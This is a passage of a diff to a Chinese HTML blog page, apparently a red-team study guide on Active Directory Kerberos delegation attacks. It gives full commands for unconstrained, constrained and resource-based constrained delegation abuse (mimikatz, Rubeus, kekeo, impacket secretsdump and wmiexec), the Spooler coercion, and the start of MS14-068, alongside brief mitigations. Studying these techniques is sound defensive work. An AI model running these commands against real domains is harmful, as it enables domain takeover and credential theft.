+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><h4 id="攻击一" class="heading-element"><span>攻击一</span>
+  <a href="#%e6%94%bb%e5%87%bb%e4%b8%80" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><pre tabindex="0"><code>用域管访问SERVER2012机器
 
 在拿到的非约束委派机器上以管理员权限运行mimikatz:
 privilege::debug
@@ -266,8 +325,11 @@ kerberos::purge
 kerberos::ptt [0;7b5d92a]-2-0-60a00000-Administrator@krbtgt-YOKAN.COM.kirbi
 
 查看票据
-kerberos::list</code></pre><p>######## 非约束委派+spooler打印机</p>
-<p>如果只是单纯的非约束委派话需要管理员主动连接，所以在实战环境利用比较鸡肋。利用非约束委派+Spooler打印机服务可以强制指定的主机进行连接，这个利用场景是tifkin_，enigma0x3和harmj0y在DerbyCon 2018提出的</p>
+kerberos::list</code></pre><h4 id="非约束委派spooler打印机" class="heading-element"><span>非约束委派+spooler打印机</span>
+  <a href="#%e9%9d%9e%e7%ba%a6%e6%9d%9f%e5%a7%94%e6%b4%bespooler%e6%89%93%e5%8d%b0%e6%9c%ba" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>如果只是单纯的非约束委派话需要管理员主动连接，所以在实战环境利用比较鸡肋。利用非约束委派+Spooler打印机服务可以强制指定的主机进行连接，这个利用场景是tifkin_，enigma0x3和harmj0y在DerbyCon 2018提出的</p>
 <p><strong>利用原理</strong></p>
 <p>利用Windows打印系统远程协议（MS-RPRN）中的一种旧的但是默认启用的方法，在该方法中，域用户可以使用MS-RPRN RpcRemoteFindFirstPrinterChangeNotification（Ex）方法强制任何运行了Spooler服务的计算机以通过Kerberos或NTLM对攻击者选择的目标进行身份验证。</p>
 <p>复现参考：</p>
@@ -286,24 +348,27 @@ ls [\ad\pipe\spoolss](file://ad/pipe/spoolss)
 （3）使用Rubeus监听来自域控（AD）的4624登录日志(需要管理员权限)：
 （4）在win10主机上运行SpoolSample.exe，向域控（WIN-1D09BAA27UF）的Spooler服务发送请求，强制域控（WIN-1D09BAA27UF)向win10主机发起认证：
 （5）捕捉到来自域控（AD）的认证请求，导出其TGT数据：
-（6）使用Rubues进行PTT票据传递</code></pre><h6 id="约束型委派" class="heading-element"><span>0.0.0.4.2  约束型委派</span>
+（6）使用Rubues进行PTT票据传递</code></pre><h2 id="约束型委派" class="heading-element"><span>约束型委派</span>
   <a href="#%e7%ba%a6%e6%9d%9f%e5%9e%8b%e5%a7%94%e6%b4%be" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>####### 侦察方法</p>
-<pre tabindex="0"><code>##### AdFind.exe查询约束委派机器账户
+</h2><h3 id="侦察方法" class="heading-element"><span>侦察方法</span>
+  <a href="#%e4%be%a6%e5%af%9f%e6%96%b9%e6%b3%95" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><pre tabindex="0"><code># AdFind.exe查询约束委派机器账户
 AdFind.exe -b &#34;DC=redteam,DC=lab&#34; -f &#34;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&#34; msds-allowedtodelegateto
 
-##### AdFind.exe查询约束委派服务账户
+# AdFind.exe查询约束委派服务账户
 AdFind.exe -b &#34;DC=redteam,DC=lab&#34; -f &#34;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&#34; cn distinguishedName msds-allowedtodelegateto
 
-##### 导入
+# 导入
 powershell-import PowerView.ps1
 
-##### PowerView查询约束委派机器账户
+# PowerView查询约束委派机器账户
 powershell Get-DomainComputer -TrustedToAuth -domain redteam.lab -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto|ft -Wrap -AutoSize
 
-##### PowerView查询约束委派服务账户
+# PowerView查询约束委派服务账户
 powershell Get-DomainUser –TrustedToAuth -domain redteam.lab -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto|fl</code></pre><p><strong>由于非约束委派的不安全性</strong>，微软在windows2003中发布了约束委派的功能，如下所示</p>
 <p>在约束委派中的kerberos中，用户同样还是会将TGT发送给相关受委派的服务，但是由于S4U2proxy的影响，对发送给受委派的服务去访问其他服务做了限制，<strong>不允许受委派的服务代表用户使用这个TGT去访问任意服务，而是只能访问指定的服务。</strong></p>
 <p>引入了两个新的概念S4U2Self和S4U2Proxy</p>
@@ -327,8 +392,11 @@ powershell Get-DomainUser –TrustedToAuth -domain redteam.lab -Properties disti
 <p>S4U2Proxy允许受约束委派的服务通过服务票据ST，然后代表用户去请求指定的服务。</p>
 <p>==由于服务用户<strong>只能获取某个用户（或主机）的服务的ST1而非TGT，所以只能模拟用户访问特定的服务</strong>，但是如果能拿到约束委派用户（或主机）的密码或者Hash，就可以<strong>伪造S4U的请求，伪装成服务用户以任意用户的权限申请访问指定服务的ST2</strong>。==</p>
 <p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404021705451.webp" alt="image-20240402170549288" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404021705451.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404021705451.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404021705451.webp?size=large 2x" data-title="image-20240402170549288" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<p>####### 攻击</p>
-<ul>
+<h3 id="攻击-1" class="heading-element"><span>攻击</span>
+  <a href="#%e6%94%bb%e5%87%bb-1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><ul>
 <li>利用1</li>
 </ul>
 <pre tabindex="0"><code>当知道justtest这个服务用户的明文密码或者Hash时，可以用kekeo请求它的TGT:
@@ -379,11 +447,11 @@ python wmiexec.py -no-pass -k administrator@WIN-1D09BAA27UF.yokan.com -dc-ip 192
 
 （3）导出域内哈希
 set KRB5CCNAME=administrator.ccache
-python secretsdump.py -no-pass -k WIN-1D09BAA27UF.yokan.com</code></pre><h6 id="基于资源的约束性委派--rbcd" class="heading-element"><span>0.0.0.4.3  基于资源的约束性委派  RBCD</span>
+python secretsdump.py -no-pass -k WIN-1D09BAA27UF.yokan.com</code></pre><h2 id="基于资源的约束性委派--rbcd" class="heading-element"><span>基于资源的约束性委派  RBCD</span>
   <a href="#%e5%9f%ba%e4%ba%8e%e8%b5%84%e6%ba%90%e7%9a%84%e7%ba%a6%e6%9d%9f%e6%80%a7%e5%a7%94%e6%b4%be--rbcd" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>在设置相关的约束委派的实现的时候不再需要域管理员自己去设置相关约束委派的属性，而操作权落在了当前登录的机器或者用户的手中</p>
+</h2><p>在设置相关的约束委派的实现的时候不再需要域管理员自己去设置相关约束委派的属性，而操作权落在了当前登录的机器或者用户的手中</p>
 <p>条件</p>
 <ul>
 <li>不需要域管理员权限</li>
@@ -391,29 +459,44 @@ python secretsdump.py -no-pass -k WIN-1D09BAA27UF.yokan.com</code></pre><h6 id="
 <li>可以创建机器账户的域用户（或已知机器账户）</li>
 </ul>
 <p>==简单来说就是你获得的用户对该主机的属性具有写权限，那么这个用户就可以对该主机进行攻击==</p>
-<p>####### 基于资源的约束性委派的优势</p>
-<ul>
+<h3 id="基于资源的约束性委派的优势" class="heading-element"><span>基于资源的约束性委派的优势</span>
+  <a href="#%e5%9f%ba%e4%ba%8e%e8%b5%84%e6%ba%90%e7%9a%84%e7%ba%a6%e6%9d%9f%e6%80%a7%e5%a7%94%e6%b4%be%e7%9a%84%e4%bc%98%e5%8a%bf" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><ul>
 <li>委派的权限授予给了拥有资源的后端，而不再是前端</li>
 <li>约束性委派不能跨域进行委派，基于资源的约束性委派==可以跨域和林==</li>
 <li>不再需要域管理员权限设置委派，只需拥有在计算机对象上编辑msDS-AllowedToActOnBehaffOtherldentity属性权限也就是将计算机加入域的域用户和机器自身拥有权限。</li>
 </ul>
-<p>####### 约束性委派和基于资源的约束性委派配置的差别</p>
-<ul>
+<h3 id="约束性委派和基于资源的约束性委派配置的差别" class="heading-element"><span>约束性委派和基于资源的约束性委派配置的差别</span>
+  <a href="#%e7%ba%a6%e6%9d%9f%e6%80%a7%e5%a7%94%e6%b4%be%e5%92%8c%e5%9f%ba%e4%ba%8e%e8%b5%84%e6%ba%90%e7%9a%84%e7%ba%a6%e6%9d%9f%e6%80%a7%e5%a7%94%e6%b4%be%e9%85%8d%e7%bd%ae%e7%9a%84%e5%b7%ae%e5%88%ab" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><ul>
 <li>==传统的约束委派是正向的，通过修改服务A的属性msDS-AlowedToDelegateTo，添加服务B的SPN，设置约束委派对象（服务B)，服务A便可以模拟用户向域控制器请求访问服务B的ST服务票据。==</li>
 <li>==而基于资源的约束委派则是相反的，通过修改服务B属性msDS-AllowedToActOnBehalfOfotherldentity，添加服务A的SID，达到让服务A模拟用户访问B资源的目的。==</li>
 <li>msDS-AllowedToActOnBehalfOfOtherIdentity属性指向委派账户（也就是我们创建的机器账户或已知机器账户）</li>
 </ul>
-<p>####### 什么用户能够修改msDS-AllowedToActOnBehalfOfOtherIdentity属性：</p>
-<ul>
+<h3 id="什么用户能够修改msds-allowedtoactonbehalfofotheridentity属性" class="heading-element"><span>什么用户能够修改msDS-AllowedToActOnBehalfOfOtherIdentity属性：</span>
+  <a href="#%e4%bb%80%e4%b9%88%e7%94%a8%e6%88%b7%e8%83%bd%e5%a4%9f%e4%bf%ae%e6%94%b9msds-allowedtoactonbehalfofotheridentity%e5%b1%9e%e6%80%a7" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><ul>
 <li>将主机加入域的用户(账户中有一个<code>mSDS-CreatorSID</code>属性，用于标记加入域时使用的用户的SID值，反查就可以知道是谁把机器加入域的了)</li>
 <li>Account Operator组成员</li>
 <li>该主机的机器账户</li>
 </ul>
-<p>####### 什么是将机器加入域的域用户？</p>
-<p>因为将一个机器加入域的时候不是要输入一个域用户的账户密码吗 就是输入的这个用户</p>
+<h3 id="什么是将机器加入域的域用户" class="heading-element"><span>什么是将机器加入域的域用户？</span>
+  <a href="#%e4%bb%80%e4%b9%88%e6%98%af%e5%b0%86%e6%9c%ba%e5%99%a8%e5%8a%a0%e5%85%a5%e5%9f%9f%e7%9a%84%e5%9f%9f%e7%94%a8%e6%88%b7" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>因为将一个机器加入域的时候不是要输入一个域用户的账户密码吗 就是输入的这个用户</p>
 <p>如果一个域环境 域用户A 将域内win2012 和 win7 加入了域 我们拿到了域用户A的权限 就可以拿下win2012 和 win7</p>
-<p>####### 攻击</p>
-<p>直接用impact打</p>
+<h3 id="攻击-2" class="heading-element"><span>攻击</span>
+  <a href="#%e6%94%bb%e5%87%bb-2" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>直接用impact打</p>
 <pre tabindex="0"><code>生成机器账户
 01.proxychains impacket-addcomputer -method SAMR xiaorang.lab/lixiuying:winniethepooh -computer-name 02\$ -computer-pass Passw0rd -dc-ip 172.22.15.13
 02.SharpAllowedToAct.exe -m ljc886 -p qwer1234! -t XR-0687 -a XR-DC01.xiaorang.lab -d xiaorang.lab
@@ -445,32 +528,38 @@ proxychains impacket-wmiexec XR-0687.xiaorang.lab -no-pass -k -dc-ip 172.22.15.1
 <p>因为Rubeus是不支持明文的，所以先把它转换为hash</p>
 <pre tabindex="0"><code>Rubeus.exe hash /user:evilsystem /password:evil /domain:test.local</code></pre><p>然后用<code>evilsystem$</code>的hash请求白银票据并导入到当前会话中</p>
 <pre tabindex="0"><code>Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:cifs/dm2008 /ptt</code></pre><p>导入之后尝试访问dm2008</p>
-<h6 id="域委派防范措施" class="heading-element"><span>0.0.0.4.4  域委派防范措施</span>
+<h2 id="域委派防范措施" class="heading-element"><span>域委派防范措施</span>
   <a href="#%e5%9f%9f%e5%a7%94%e6%b4%be%e9%98%b2%e8%8c%83%e6%8e%aa%e6%96%bd" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>高权限用户，设置为<code>敏感用户，不能被委派</code></p>
+</h2><p>高权限用户，设置为<code>敏感用户，不能被委派</code></p>
 <p>主机账号需设置委派时，只能设置为约束性委派;</p>
 <p>Windows 2012 R2及更高的系统建立了受保护的用户组Protected Users，组内用户不允许被委派，这是有效的手段。受保护的用户组,</p>
 <p>但有一个cve可绕过这些限制CVE-2020-1704</p>
-<h5 id="pac攻击" class="heading-element"><span>0.0.0.5  PAC攻击</span>
+<h1 id="pac攻击" class="heading-element"><span>PAC攻击</span>
   <a href="#pac%e6%94%bb%e5%87%bb" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><h6 id="ms14-068" class="heading-element"><span>0.0.0.5.1  MS14-068</span>
+</h1><h2 id="ms14-068" class="heading-element"><span>MS14-068</span>
   <a href="#ms14-068" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>漏洞危害：允许任意域成员提权为域管权限</p>
-<p>####### 前提</p>
-<p>1.域控没有打MS14-068的补丁(KB3011780)</p>
+</h2><p>漏洞危害：允许任意域成员提权为域管权限</p>
+<h3 id="前提" class="heading-element"><span>前提</span>
+  <a href="#%e5%89%8d%e6%8f%90" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>1.域控没有打MS14-068的补丁(KB3011780)</p>
 <p>2.拿下一台加入域的计算机</p>
 <p>3.有这台域内计算机的域用户密码和Sid</p>
 <p>漏洞自检可在域控命令查询，以下两种方式皆可：</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>systeminfo |findstr <span style="color:#a6be9d">&#34;KB3011780&#34;</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>wmic qfe GET hotfixid |findstr <span style="color:#a6be9d">&#34;KB3011780&#34;</span></span></span></code></pre></div><p>####### 原理</p>
-<blockquote>
+</span></span><span style="display:flex;"><span>wmic qfe GET hotfixid |findstr <span style="color:#a6be9d">&#34;KB3011780&#34;</span></span></span></code></pre></div><h3 id="原理" class="heading-element"><span>原理</span>
+  <a href="#%e5%8e%9f%e7%90%86" class="heading-mark">
